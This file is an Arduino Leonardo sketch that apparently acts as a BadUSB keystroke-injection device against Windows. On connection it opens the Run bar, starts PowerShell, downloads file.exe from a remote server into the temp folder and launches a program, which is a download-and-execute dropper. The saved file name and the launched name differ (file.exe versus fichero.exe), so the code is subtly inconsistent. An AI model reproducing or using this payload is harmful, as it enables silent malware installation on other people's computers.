#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell");
  delay(3000);
  Keyboard.println("powershell Import-Module BitsTransfer;");
  delay(3000);
  Keyboard.println("Start-BitsTransfer -Source \"http://server/file.exe\" -Destination \"%TEMP%\\file.exe\";");
  delay(3000);
  Keyboard.println("Start-Process \"%TEMP%\\fichero.exe\"");
  while(1);
}
